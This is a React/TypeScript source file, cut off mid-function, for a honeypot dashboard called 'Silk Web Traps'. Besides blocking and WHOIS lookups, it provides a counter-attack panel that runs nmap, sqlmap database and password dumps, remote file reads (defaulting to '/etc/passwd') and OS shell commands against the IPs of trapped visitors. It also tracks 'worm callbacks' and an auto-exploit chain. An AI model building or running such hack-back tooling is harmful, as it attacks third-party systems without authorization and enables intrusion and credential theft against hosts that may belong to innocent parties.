// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
import { useMemo, useState, useRef, useEffect, useCallback } from "react";
import { useAuth } from "@clerk/react";
import {
  useGetSilkWeb, useCollapseSilkWeb, useListTrappedAttackers, getGetSilkWebQueryKey
} from "@workspace/api-client-react";
import { useQueryClient } from "@tanstack/react-query";
import { useToast } from "@/hooks/use-toast";
import {
  Network, Skull, ShieldAlert, Bug, Loader2, XCircle,
  Copy, Search, ChevronDown, Syringe, Globe, TerminalSquare, Download,
  FolderOpen, Terminal, MonitorSmartphone, RefreshCw, FileText,
  CheckCircle2, AlertTriangle, Zap, Radio, ShieldOff, ShieldCheck, Trash2,
} from "lucide-react";
import { format } from "date-fns";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

interface Route {
  id: number;
  fromNodeId: number;
  toNodeId: number;
  routeType: string;
}

const ROUTE_COLORS: Record<string, string> = {
  highway:      "#00ff88",
  dead_end:     "#ef4444",
  decoy:        "#eab308",
  collapse_zone:"#f97316",
};
const ROUTE_OPACITY: Record<string, number> = {
  highway: 0.7, dead_end: 0.35, decoy: 0.5, collapse_zone: 0.55,
};

function SilkWebTopology({ routes, trappedIds }: { routes: Route[]; trappedIds: Set<number> }) {
  const cx = 200, cy = 200;

  const { nodePositions, outerR, innerR, outerIds, innerIds } = useMemo(() => {
    const allIds = Array.from(new Set(routes.flatMap((r) => [r.fromNodeId, r.toNodeId]))).sort((a, b) => a - b);
    const outerIds = allIds.slice(0, 50);
    const innerIds = allIds.slice(50);
    const outerR = 168, innerR = 72;
    const pos: Record<number, [number, number]> = {};
    outerIds.forEach((id, i) => {
      const a = (i / outerIds.length) * 2 * Math.PI - Math.PI / 2;
      pos[id] = [cx + outerR * Math.cos(a), cy + outerR * Math.sin(a)];
    });
    innerIds.forEach((id, i) => {
      const a = (i / Math.max(innerIds.length, 1)) * 2 * Math.PI - Math.PI / 2;
      pos[id] = [cx + innerR * Math.cos(a), cy + innerR * Math.sin(a)];
    });
    return { nodePositions: pos, outerR, innerR, outerIds, innerIds };
  }, [routes]);

  const webRings = [innerR * 0.35, innerR * 0.65, innerR, (outerR + innerR) / 2, outerR];

  return (
    <svg viewBox="-14 -14 428 428" preserveAspectRatio="xMidYMid meet" className="w-full h-full" style={{ background: "transparent" }}>
      <defs>
        <radialGradient id="webGlow" cx="50%" cy="50%" r="50%">
          <stop offset="0%" stopColor="#00ff88" stopOpacity="0.04" />
          <stop offset="100%" stopColor="#00ff88" stopOpacity="0" />
        </radialGradient>
        <filter id="glow">
          <feGaussianBlur stdDeviation="1.5" result="blur" />
          <feMerge><feMergeNode in="blur" /><feMergeNode in="SourceGraphic" /></feMerge>
        </filter>
      </defs>

      <circle cx={cx} cy={cy} r={outerR + 10} fill="url(#webGlow)" />
      {webRings.map((r, i) => (
        <circle key={i} cx={cx} cy={cy} r={r} fill="none"
          stroke="#00ff88" strokeOpacity={0.08} strokeWidth={0.5} />
      ))}
      {Array.from({ length: 12 }, (_, i) => {
        const a = (i / 12) * 2 * Math.PI;
        return <line key={i} x1={cx} y1={cy}
          x2={cx + outerR * Math.cos(a)} y2={cy + outerR * Math.sin(a)}
          stroke="#00ff88" strokeOpacity={0.04} strokeWidth={0.4} />;
      })}

      {routes.map((r) => {
        const from = nodePositions[r.fromNodeId];
        const to = nodePositions[r.toNodeId];
        if (!from || !to) return null;
        return (
          <line key={`${r.id}`}
            x1={from[0]} y1={from[1]} x2={to[0]} y2={to[1]}
            stroke={ROUTE_COLORS[r.routeType] ?? "#00ff88"}
            strokeOpacity={ROUTE_OPACITY[r.routeType] ?? 0.3}
            strokeWidth={r.routeType === "highway" ? 1.2 : 0.6}
          />
        );
      })}

      {innerIds.map((id) => {
        const pos = nodePositions[id];
        if (!pos) return null;
        const trapped = trappedIds.has(id);
        return (
          <g key={`inner-${id}`}>
            <circle cx={pos[0]} cy={pos[1]} r={4}
              fill={trapped ? "#ef4444" : "#00ff88"} fillOpacity={trapped ? 1 : 0.7} />
            {trapped && (
              <circle cx={pos[0]} cy={pos[1]} r={7} fill="none"
                stroke="#ef4444" strokeWidth={1.5} strokeOpacity={0.9}>
                <animate attributeName="r" values="7;11;7" dur="1.2s" repeatCount="indefinite" />
                <animate attributeName="stroke-opacity" values="0.9;0.3;0.9" dur="1.2s" repeatCount="indefinite" />
              </circle>
            )}
          </g>
        );
      })}
      {outerIds.map((id) => {
        const pos = nodePositions[id];
        if (!pos) return null;
        const trapped = trappedIds.has(id);
        return (
          <g key={`outer-${id}`}>
            <circle cx={pos[0]} cy={pos[1]} r={2.5}
              fill={trapped ? "#ef4444" : "#00ff88"} fillOpacity={trapped ? 1 : 0.6} />
            {trapped && (
              <circle cx={pos[0]} cy={pos[1]} r={5} fill="none"
                stroke="#ef4444" strokeWidth={1} strokeOpacity={0.85}>
                <animate attributeName="r" values="4;7;4" dur="1s" repeatCount="indefinite" />
                <animate attributeName="stroke-opacity" values="0.85;0.2;0.85" dur="1s" repeatCount="indefinite" />
              </circle>
            )}
          </g>
        );
      })}

      <circle cx={cx} cy={cy} r={6} fill="#00ff88" fillOpacity={0.9} filter="url(#glow)" />
      <circle cx={cx} cy={cy} r={3} fill="#ffffff" fillOpacity={0.95} />
    </svg>
  );
}

type AttackerRow = {
  id: number; ip: string; fingerprint: string; entryNodeId: number;
  loopCount: number; trappedAt: string; dataCollected: string;
  honeypotPort?: number | null; probeType?: string | null;
  sqlmapStatus?: string | null; sqlmapJobId?: string | null;
  sqlmapResults?: string | null; sqlmapStartedAt?: string | null;
  sqlmapFinishedAt?: string | null;
};

type PanelTab = "portscan" | "sqlmap" | "console" | "files" | "osshell" | "control";

// ── IP address dropdown menu ──────────────────────────────────────────────────
function IpDropdown({
  attacker,
  onOpen,
  onMutated,
}: {
  attacker: AttackerRow;
  onOpen: (att: AttackerRow, tab: PanelTab) => void;
  onMutated: () => void;
}) {
  const [open, setOpen] = useState(false);
  const [busyBlock, setBusyBlock]   = useState(false);
  const [busyAllow, setBusyAllow]   = useState(false);
  const [busyDelete, setBusyDelete] = useState(false);
  const ref = useRef<HTMLDivElement>(null);
  const { toast }    = useToast();
  const { getToken } = useAuth();

  useEffect(() => {
    if (!open) return;
    const handler = (e: MouseEvent) => {
      if (ref.current && !ref.current.contains(e.target as Node)) setOpen(false);
    };
    document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  }, [open]);

  const authFetch = useCallback(async (url: string, init?: RequestInit) => {
    const token = await getToken();
    return fetch(url, {
      ...init,
      credentials: "include",
      headers: { "Content-Type": "application/json", ...(token ? { Authorization: `Bearer ${token}` } : {}), ...init?.headers },
    });
  }, [getToken]);

  const copyIp = () => {
    navigator.clipboard.writeText(attacker.ip);
    toast({ title: "Copied", description: `${attacker.ip} copied to clipboard` });
    setOpen(false);
  };

  const whois = () => {
    window.open(`https://search.arin.net/rdap/?query=${attacker.ip}`, "_blank");
    setOpen(false);
  };

  const blockIp = async () => {
    setBusyBlock(true);
    setOpen(false);
    try {
      const r = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/block-ip`, { method: "POST" });
      const d = await r.json();
      if (d.alreadyBlocked) {
        toast({ title: "Already Blocked", description: `${attacker.ip} is already in the firewall block list.` });
      } else {
        toast({ title: "IP Blocked", description: `${attacker.ip} added to firewall — all traffic dropped.` });
      }
      onMutated();
    } catch {
      toast({ title: "Block Failed", description: "Could not add IP to firewall.", variant: "destructive" });
    } finally {
      setBusyBlock(false);
    }
  };

  const allowIp = async () => {
    setBusyAllow(true);
    setOpen(false);
    try {
      await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/allow-ip`, { method: "POST" });
      toast({ title: "IP Allowed", description: `${attacker.ip} removed from block list — traffic permitted.` });
      onMutated();
    } catch {
      toast({ title: "Allow Failed", description: "Could not unblock IP.", variant: "destructive" });
    } finally {
      setBusyAllow(false);
    }
  };

  const deleteEntry = async () => {
    setBusyDelete(true);
    setOpen(false);
    try {
      await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}`, { method: "DELETE" });
      toast({ title: "Entry Deleted", description: `Trapped entry for ${attacker.ip} has been removed.` });
      onMutated();
    } catch {
      toast({ title: "Delete Failed", description: "Could not remove entry.", variant: "destructive" });
    } finally {
      setBusyDelete(false);
    }
  };

  const actions = [
    {
      icon: <Search className="w-3.5 h-3.5" />,
      label: "Port Scan (nmap)",
      sub: "Discover open ports & services",
      color: "text-primary",
      onClick: () => { onOpen(attacker, "portscan"); setOpen(false); },
    },
    {
      icon: <Syringe className="w-3.5 h-3.5" />,
      label: "SQL Injection (SQLmap)",
      sub: "Test for SQL vulnerabilities & dump data",
      color: "text-red-400",
      onClick: () => { onOpen(attacker, "sqlmap"); setOpen(false); },
    },
    {
      icon: <Globe className="w-3.5 h-3.5" />,
      label: "WHOIS / ARIN Lookup",
      sub: "Identify owner — evidence for law enforcement",
      color: "text-blue-400",
      onClick: whois,
    },
    {
      icon: <Copy className="w-3.5 h-3.5" />,
      label: "Copy IP Address",
      sub: attacker.ip,
      color: "text-primary/60",
      onClick: copyIp,
    },
  ];

  const isBusy = busyBlock || busyAllow || busyDelete;

  return (
    <div ref={ref} className="relative inline-block">
      <button
        onClick={(e) => { e.stopPropagation(); setOpen((v) => !v); }}
        className="flex items-center gap-1 text-red-400 font-bold font-mono hover:text-red-300 transition-colors group"
      >
        {isBusy ? <Loader2 className="w-3 h-3 animate-spin text-yellow-400" /> : null}
        <span className="underline underline-offset-2 decoration-red-500/40">{attacker.ip}</span>
        <ChevronDown className={`w-3 h-3 text-red-400/60 transition-transform duration-150 ${open ? "rotate-180" : ""}`} />
      </button>

      {open && (
        <div className="absolute left-0 top-full mt-1 z-50 w-72 border border-yellow-500/40 bg-[#070c08] shadow-2xl shadow-black/80 rounded overflow-hidden">
          {/* Header */}
          <div className="px-3 py-2 border-b border-yellow-500/20 bg-yellow-500/5">
            <div className="flex items-center gap-2">
              <TerminalSquare className="w-3.5 h-3.5 text-yellow-400" />
              <span className="text-[10px] font-mono text-yellow-400 uppercase tracking-widest font-bold">
                Attacker Actions — {attacker.ip}
              </span>
            </div>
          </div>

          {/* Recon / exploit actions */}
          <div className="py-1">
            {actions.map((a, i) => (
              <button
                key={i}
                onClick={a.onClick}
                className="w-full flex items-start gap-3 px-3 py-2.5 hover:bg-white/5 transition-colors text-left group"
              >
                <span className={`${a.color} mt-0.5 shrink-0`}>{a.icon}</span>
                <div className="min-w-0">
                  <div className={`text-xs font-mono font-semibold ${a.color}`}>{a.label}</div>
                  <div className="text-[10px] text-primary/35 font-mono truncate">{a.sub}</div>
                </div>
              </button>
            ))}
          </div>

          {/* Management actions */}
          <div className="border-t border-yellow-500/20 py-1">
            <div className="px-3 py-1">
              <span className="text-[9px] font-mono text-primary/30 uppercase tracking-widest">IP Management</span>
            </div>
            {/* Block */}
            <button
              onClick={blockIp}
              disabled={busyBlock}
              className="w-full flex items-start gap-3 px-3 py-2.5 hover:bg-red-500/5 transition-colors text-left disabled:opacity-50"
            >
              {busyBlock ? <Loader2 className="w-3.5 h-3.5 text-red-400 animate-spin mt-0.5 shrink-0" /> : <ShieldOff className="w-3.5 h-3.5 text-red-400 mt-0.5 shrink-0" />}
              <div className="min-w-0">
                <div className="text-xs font-mono font-semibold text-red-400">Block IP</div>
                <div className="text-[10px] text-primary/35 font-mono">Add to firewall — drop all traffic</div>
              </div>
            </button>
            {/* Allow */}
            <button
              onClick={allowIp}
              disabled={busyAllow}
              className="w-full flex items-start gap-3 px-3 py-2.5 hover:bg-primary/5 transition-colors text-left disabled:opacity-50"
            >
              {busyAllow ? <Loader2 className="w-3.5 h-3.5 text-primary animate-spin mt-0.5 shrink-0" /> : <ShieldCheck className="w-3.5 h-3.5 text-primary mt-0.5 shrink-0" />}
              <div className="min-w-0">
                <div className="text-xs font-mono font-semibold text-primary">Allow IP</div>
                <div className="text-[10px] text-primary/35 font-mono">Remove from block list — permit traffic</div>
              </div>
            </button>
            {/* Delete */}
            <button
              onClick={deleteEntry}
              disabled={busyDelete}
              className="w-full flex items-start gap-3 px-3 py-2.5 hover:bg-red-900/20 transition-colors text-left disabled:opacity-50"
            >
              {busyDelete ? <Loader2 className="w-3.5 h-3.5 text-red-500/70 animate-spin mt-0.5 shrink-0" /> : <Trash2 className="w-3.5 h-3.5 text-red-500/70 mt-0.5 shrink-0" />}
              <div className="min-w-0">
                <div className="text-xs font-mono font-semibold text-red-500/70">Delete Entry</div>
                <div className="text-[10px] text-primary/35 font-mono">Remove from trapped entities list</div>
              </div>
            </button>
          </div>

          {/* Footer note */}
          <div className="px-3 py-2 border-t border-yellow-500/10 bg-black/40">
            <div className="text-[9px] font-mono text-primary/25 leading-relaxed">
              Use WHOIS to obtain ISP identity for law enforcement reporting.
              Port scan & SQLmap for authorized security testing only.
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default function SilkWeb() {
  const { data: web }       = useGetSilkWeb({ query: { refetchInterval: 15000 } as any });
  const { data: attackers } = useListTrappedAttackers({ query: { refetchInterval: 8000 } as any });
  const queryClient         = useQueryClient();
  const { toast }           = useToast();
  const collapse            = useCollapseSilkWeb();
  const [selected, setSelected]       = useState<AttackerRow | null>(null);
  const [activeTab, setActiveTab]     = useState<PanelTab>("portscan");

  const routes: Route[] = (web?.routes ?? []) as Route[];
  const trappedIds = useMemo(() => {
    const ids = new Set<number>();
    (attackers?.attackers ?? []).forEach((a) => {
      if (typeof a.entryNodeId === "number") ids.add(a.entryNodeId);
    });
    return ids;
  }, [attackers]);

  const handleCollapse = () => {
    collapse.mutate(undefined, {
      onSuccess: () => {
        toast({ title: "Silk Web Collapsed", description: "Web geometry has been regenerated." });
        queryClient.invalidateQueries({ queryKey: getGetSilkWebQueryKey() });
      },
    });
  };

  const openPanel = (att: AttackerRow, tab: PanelTab) => {
    setSelected(att);
    setActiveTab(tab);
  };

  const handleMutated = useCallback(() => {
    queryClient.invalidateQueries({ queryKey: ["/api/silkweb/trapped"] });
    queryClient.invalidateQueries({ queryKey: getGetSilkWebQueryKey() });
  }, [queryClient]);

  const attackerList = (attackers?.attackers ?? []) as AttackerRow[];

  function downloadReport() {
    const rows = [["Time Trapped", "IP", "Fingerprint", "Loop Count", "Honeypot Port", "Probe Type", "SQLmap Status", "Data Collected"]];
    attackerList.forEach(a => rows.push([
      a.trappedAt ? new Date(a.trappedAt).toISOString() : "",
      a.ip ?? "",
      a.fingerprint ?? "",
      String(a.loopCount ?? 0),
      a.honeypotPort ? String(a.honeypotPort) : "",
      a.probeType ?? "",
      a.sqlmapStatus ?? "",
      a.dataCollected ?? "",
    ]));
    const csv = rows.map(r => r.map(c => `"${c.replace(/"/g,'""')}"`).join(",")).join("\n");
    const blob = new Blob([csv], { type: "text/csv" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = `proxhqvpn-silkweb-report-${Date.now()}.csv`;
    a.click();
    URL.revokeObjectURL(a.href);
  }

  return (
    <div className="space-y-4 h-full flex flex-col">
      <div className="flex items-center justify-between shrink-0">
        <h2 className="text-2xl font-bold tracking-tighter uppercase flex items-center gap-2">
          <Network className="w-6 h-6" />
          Silk Web Traps
        </h2>
        <div className="flex items-center gap-2">
          {attackerList.length > 0 && (
            <button
              onClick={downloadReport}
              className="flex items-center gap-2 border border-primary/30 text-primary/70 px-4 py-1.5 text-xs font-mono uppercase hover:bg-primary/10 hover:border-primary transition-colors"
            >
              <Download className="w-3.5 h-3.5" />
              DOWNLOAD CSV
            </button>
          )}
          <button
            onClick={handleCollapse}
            disabled={collapse.isPending}
            className="flex items-center gap-2 border border-red-500/40 text-red-400 px-4 py-1.5 text-xs font-mono uppercase hover:bg-red-500/10 hover:border-red-500 transition-colors disabled:opacity-50"
          >
            <Skull className="w-4 h-4" />
            {collapse.isPending ? "COLLAPSING…" : "COLLAPSE WEB"}
          </button>
        </div>
      </div>

      {/* Stats bar */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 shrink-0">
        {[
          { label: "Total Routes",  value: web?.totalRoutes ?? 0,     color: "text-primary" },
          { label: "Dead Ends",     value: web?.deadEndRoutes ?? 0,   color: "text-red-400" },
          { label: "Highways",      value: web?.activeHighways ?? 0,  color: "text-primary" },
          { label: "Trapped",       value: attackerList.length,       color: "text-yellow-400" },
        ].map(({ label, value, color }) => (
          <div key={label} className="border border-primary/20 bg-black p-3">
            <div className="text-[9px] font-mono text-primary/50 uppercase mb-1">{label}</div>
            <div className={`font-bold font-mono text-2xl ${color}`}>{value}</div>
          </div>
        ))}
      </div>

      {/* Main area: topology + list, with command panel slide-over */}
      <div className="flex-1 overflow-hidden flex flex-col lg:flex-row gap-4 min-h-0">

        {/* Left: topology + attacker list */}
        <div className={`flex flex-col gap-4 transition-all duration-300 ${selected ? "lg:w-[40%]" : "w-full"}`}>
          {/* Topology */}
          <div className="border border-primary/20 rounded bg-black flex flex-col shrink-0 overflow-hidden">
            <div className="p-2 border-b border-primary/20 flex items-center justify-between shrink-0">
              <span className="text-xs font-mono text-primary/60 uppercase tracking-widest">Topology Map</span>
              <div className="flex items-center gap-3 text-[10px] font-mono">
                {[["#00ff88","HWY"],["#ef4444","DEAD"],["#eab308","DECOY"],["#f97316","COLLAPSE"]].map(([c,l]) => (
                  <span key={l} className="flex items-center gap-1">
                    <span className="inline-block w-3 h-0.5" style={{ background: c }} />
                    {l}
                  </span>
                ))}
              </div>
            </div>
            {/* Square canvas — always renders at 1:1 so the ring stays circular */}
            <div className="w-full p-2" style={{ aspectRatio: "1 / 1", maxHeight: selected ? "240px" : "420px" }}>
              {routes.length > 0
                ? <SilkWebTopology routes={routes} trappedIds={trappedIds} />
                : <div className="h-full flex items-center justify-center font-mono text-primary/30 text-xs uppercase tracking-widest">Awaiting web data…</div>
              }
            </div>
          </div>

          {/* Attacker list */}
          <div className="border border-primary/20 rounded bg-black flex flex-col flex-1 min-h-0 overflow-hidden">
            <div className="p-3 border-b border-primary/20 flex items-center gap-2 text-red-400 font-bold text-xs tracking-widest uppercase shrink-0">
              <ShieldAlert className="w-4 h-4" />
              Trapped Entities ({attackerList.length})
              <span className="ml-auto text-primary/30 font-normal normal-case text-[10px]">Click IP for actions</span>
            </div>
            <div className="flex-1 overflow-auto">
              {attackerList.length === 0 && (
                <div className="h-full flex items-center justify-center font-mono text-primary/30 text-xs uppercase tracking-widest">
                  No entities currently trapped
                </div>
              )}
              {attackerList.map((att) => {
                const isActive = selected?.id === att.id;
                const statusColor =
                  att.sqlmapStatus === "complete" ? "text-primary" :
                  att.sqlmapStatus === "running"  ? "text-yellow-400" :
                  att.sqlmapStatus === "error"    ? "text-red-400"    : "text-primary/30";
                return (
                  <div
                    key={att.id}
                    className={`border-b border-primary/10 px-3 py-2.5 text-xs font-mono transition-colors ${isActive ? "bg-primary/10 border-l-2 border-l-primary" : "hover:bg-primary/5"}`}
                  >
                    <div className="flex items-start gap-2 flex-wrap">
                      {/* Clickable IP with dropdown */}
                      <IpDropdown attacker={att} onOpen={openPanel} onMutated={handleMutated} />

                      {att.honeypotPort && (
                        <span className="text-yellow-400/70 text-[10px] border border-yellow-500/20 px-1 rounded">
                          honeypot:{att.honeypotPort}
                        </span>
                      )}
                      {att.probeType && (
                        <span className="text-orange-400/60 text-[10px] border border-orange-500/20 px-1 rounded">
                          {att.probeType}
                        </span>
                      )}
                      <span className="text-primary/40">{format(new Date(att.trappedAt), "HH:mm dd/MM")}</span>
                      <span className="text-primary/40">loops:{att.loopCount}</span>
                      <span className={`ml-auto text-[10px] uppercase ${statusColor}`}>{att.sqlmapStatus ?? "idle"}</span>
                    </div>
                    <div className="text-primary/25 text-[10px] truncate mt-0.5">{att.fingerprint}</div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>

        {/* Right: attacker command panel */}
        {selected && (
          <div className="lg:flex-1 border border-yellow-500/30 rounded bg-black flex flex-col min-h-0 overflow-hidden">
            <AttackerCommandPanel
              attacker={selected}
              initialTab={activeTab}
              onTabChange={setActiveTab}
              onClose={() => setSelected(null)}
              onRefresh={() => queryClient.invalidateQueries({ queryKey: ["listTrappedAttackers"] })}
            />
          </div>
        )}
      </div>
    </div>
  );
}

// ── Full attacker command panel ───────────────────────────────────────────────
function AttackerCommandPanel({
  attacker, initialTab, onTabChange, onClose, onRefresh,
}: {
  attacker: AttackerRow;
  initialTab: PanelTab;
  onTabChange: (t: PanelTab) => void;
  onClose: () => void;
  onRefresh: () => void;
}) {
  const { toast } = useToast();
  const { getToken } = useAuth();
  const [tab, setTab] = useState<PanelTab>(initialTab);

  // Authenticated fetch — attaches Clerk Bearer token so requireAdmin passes
  const authFetch = useCallback(async (url: string, init?: RequestInit) => {
    const token = await getToken();
    const headers: Record<string, string> = {
      ...(init?.headers as Record<string, string> ?? {}),
    };
    if (token) headers["Authorization"] = `Bearer ${token}`;
    return fetch(url, { credentials: "include", ...init, headers });
  }, [getToken]);

  useEffect(() => { setTab(initialTab); }, [initialTab]);

  // ── Port scan state ──────────────────────────────────────────────────────────
  const [scanPorts, setScanPorts] = useState("1-10000");
  const [scanFlags, setScanFlags] = useState("-sV -T4");
  const [scanning, setScanning]   = useState(false);
  const [scanOutput, setScanOutput] = useState<string | null>(null);
  const [scanCmd, setScanCmd]     = useState<string | null>(null);

  // ── SQLmap state ─────────────────────────────────────────────────────────────
  const [sqlTarget, setSqlTarget] = useState(`http://${attacker.ip}/`);
  const [sqlFlags, setSqlFlags]   = useState("--dbs --forms");
  const [sqlRunning, setSqlRunning] = useState(false);
  const [sqlOutput, setSqlOutput] = useState<string | null>(attacker.sqlmapResults ?? null);
  const [sqlJobId, setSqlJobId]   = useState<string | null>(attacker.sqlmapJobId ?? null);
  const [sqlStatus, setSqlStatus] = useState(attacker.sqlmapStatus ?? "idle");

  // ── Console state (custom sqlmap) ─────────────────────────────────────────
  const [consoleFlags, setConsoleFlags] = useState(
    `--level=5 --risk=3 --dbs --tables --users --passwords --dump-all`
  );
  const [consoleRunning, setConsoleRunning] = useState(false);
  const [consoleOutput, setConsoleOutput]   = useState<string | null>(null);
  const [consoleJobId, setConsoleJobId]     = useState<string | null>(null);
  const [consoleCmd, setConsoleCmd]         = useState<string | null>(null);

  // ── File manager state ────────────────────────────────────────────────────
  const [filePath, setFilePath]     = useState("/etc/passwd");
  const [fileRunning, setFileRunning] = useState(false);
  const [fileOutput, setFileOutput]   = useState<string | null>(null);
  const [fileJobId, setFileJobId]     = useState<string | null>(null);

  // ── OS Shell state ────────────────────────────────────────────────────────
  const [osCmd, setOsCmd]         = useState("id && uname -a && whoami && hostname");
  const [osRunning, setOsRunning] = useState(false);
  const [osOutput, setOsOutput]   = useState<string | null>(null);
  const [osJobId, setOsJobId]     = useState<string | null>(null);
  const [osHistory, setOsHistory] = useState<{ cmd: string; out: string }[]>([]);

  // ── Control panel state ───────────────────────────────────────────────────
  interface WormCallback { ts: string; ua?: string; ref?: string; wormId?: string; callbackIp?: string }
  interface ControlData {
    wormCallbacks: WormCallback[]; banner?: string; rawRequest?: string; nodeRegion?: string;
    sqlmapStatus?: string; sqlmapResults?: string; loopCount?: number;
    autoExploitStatus?: string | null;
    autoExploitIp?: string | null;
    autoExploitJobId?: string | null;
    autoExploitStartedAt?: string | null;
    autoExploitFinishedAt?: string | null;
    autoExploitNmap?: string | null;
    autoExploitSqlmap?: string | null;
  }
  const [controlData, setControlData] = useState<ControlData | null>(null);
  const [controlLoading, setControlLoading] = useState(false);

  const switchTab = (t: PanelTab) => { setTab(t); onTabChange(t); };

  const runPortScan = async () => {
    setScanning(true);
    setScanOutput(null);
    setScanCmd(null);
    try {
      const res = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/portscan`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ports: scanPorts, flags: scanFlags }),
      });
      const data = await res.json();
      if (!res.ok) {
        toast({ title: "Port Scan Error", description: data.error, variant: "destructive" });
        setScanning(false); return;
      }
      setScanCmd(data.cmd);
      toast({ title: "Port Scan Launched", description: `Job ${data.jobId} — scanning ${attacker.ip}` });
      const poll = setInterval(async () => {
        try {
          const pr = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/portscan/${data.jobId}`);
          const pd = await pr.json();
          if (pd.status !== "running") {
            setScanOutput(pd.results ?? "No output");
            setScanning(false); clearInterval(poll);
          }
        } catch { /* ignore */ }
      }, 4000);
    } catch (e: any) {
      setScanOutput("Error: " + e.message);
      setScanning(false);
    }
  };

  const runSqlmap = async () => {
    setSqlRunning(true);
    setSqlOutput(null);
    setSqlStatus("running");
    try {
      const res = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/sqlmap`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ targetUrl: sqlTarget, extraFlags: sqlFlags }),
      });
      const data = await res.json();
      if (!res.ok) {
        setSqlStatus("error");
        setSqlOutput(data.error ?? "Unknown error");
        toast({ title: "SQLmap Error", description: data.error, variant: "destructive" });
        setSqlRunning(false);
        return;
      }
      setSqlJobId(data.jobId);
      toast({ title: "SQLmap Launched", description: `Job ${data.jobId} — scanning ${attacker.ip}` });

      const poll = setInterval(async () => {
        try {
          const pr = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/sqlmap`);
          const pd = await pr.json();
          if (pd.status !== "running") {
            setSqlStatus(pd.status ?? "complete");
            setSqlOutput(pd.results ?? "No output");
            setSqlRunning(false);
            onRefresh();
            clearInterval(poll);
          }
        } catch { /* ignore poll error */ }
      }, 4000);
    } catch (e: any) {
      setSqlStatus("error");
      setSqlOutput("Error: " + e.message);
      setSqlRunning(false);
    }
  };

  // ── Console: custom sqlmap command ───────────────────────────────────────
  const runConsole = async () => {
    setConsoleRunning(true);
    setConsoleOutput(null);
    setConsoleCmd(null);
    try {
      const res = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/sqlmap-custom`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ customFlags: consoleFlags, targetUrl: sqlTarget }),
      });
      const data = await res.json();
      if (!res.ok) { toast({ title: "Console Error", description: data.error, variant: "destructive" }); setConsoleRunning(false); return; }
      setConsoleJobId(data.jobId);
      setConsoleCmd(data.cmd);
      toast({ title: "SQLmap Console Running", description: `Job ${data.jobId}` });
      const poll = setInterval(async () => {
        try {
          const pr = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/sqlmap-custom/${data.jobId}`);
          const pd = await pr.json();
          if (pd.status !== "running") { setConsoleOutput(pd.results ?? "No output"); setConsoleRunning(false); clearInterval(poll); }
        } catch { /* ignore */ }
      }, 4000);
    } catch (e: any) { setConsoleOutput("Error: " + e.message); setConsoleRunning(false); }
  };

  // ── File manager: --file-read ─────────────────────────────────────────────
  const runFileRead = async (path?: string) => {
    const target = path ?? filePath;
    setFilePath(target);
    setFileRunning(true);
    setFileOutput(null);
    try {
      const res = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/file-read`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ filePath: target, targetUrl: sqlTarget }),
      });
      const data = await res.json();
      if (!res.ok) { toast({ title: "File Read Error", description: data.error, variant: "destructive" }); setFileRunning(false); return; }
      setFileJobId(data.jobId);
      toast({ title: "File Read Initiated", description: target });
      const poll = setInterval(async () => {
        try {
          const pr = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/file-read/${data.jobId}`);
          const pd = await pr.json();
          if (pd.status !== "running") { setFileOutput(pd.results ?? "No output"); setFileRunning(false); clearInterval(poll); }
        } catch { /* ignore */ }
      }, 4000);
    } catch (e: any) { setFileOutput("Error: " + e.message); setFileRunning(false); }
  };

  const downloadFileOutput = () => {
    if (!fileOutput) return;
    const blob = new Blob([fileOutput], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url; a.download = `${attacker.ip}-${filePath.replace(/[^a-zA-Z0-9.]/g, "_")}.txt`;
    a.click(); URL.revokeObjectURL(url);
  };

  // ── OS Shell: --os-cmd ────────────────────────────────────────────────────
  const runOsCmd = async () => {
    setOsRunning(true);
    setOsOutput(null);
    try {
      const res = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/os-cmd`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ osCmd, targetUrl: sqlTarget }),
      });
      const data = await res.json();
      if (!res.ok) { toast({ title: "OS Cmd Error", description: data.error, variant: "destructive" }); setOsRunning(false); return; }
      setOsJobId(data.jobId);
      toast({ title: "OS Command Sent", description: osCmd });
      const poll = setInterval(async () => {
        try {
          const pr = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/os-cmd/${data.jobId}`);
          const pd = await pr.json();
          if (pd.status !== "running") {
            setOsOutput(pd.results ?? "No output");
            setOsHistory(h => [{ cmd: osCmd, out: pd.results ?? "" }, ...h].slice(0, 20));
            setOsRunning(false); clearInterval(poll);
          }
        } catch { /* ignore */ }
      }, 4000);
    } catch (e: any) { setOsOutput("Error: " + e.message); setOsRunning(false); }
  };

  // ── Control panel: load intelligence data ──────────────────────────────────
  const loadControlData = useCallback(async () => {
    setControlLoading(true);
    try {
      const r = await authFetch(`${BASE}/api/silkweb/trapped/${attacker.id}/control-data`);
      const d = await r.json();
      if (r.ok) setControlData(d);
    } catch { /* ignore */ } finally { setControlLoading(false); }
  }, [attacker.id, authFetch]);

  useEffect(() => {
    if (tab === "control" && !controlData) loadControlData();
  }, [tab, controlData, loadControlData]);

  // Auto-poll while worm exploit chain is running
  useEffect(() => {
    if (controlData?.autoExploitStatus !== "running") return;
    const t = setInterval(() => loadControlData(), 5000);
    return () => clearInterval(t);
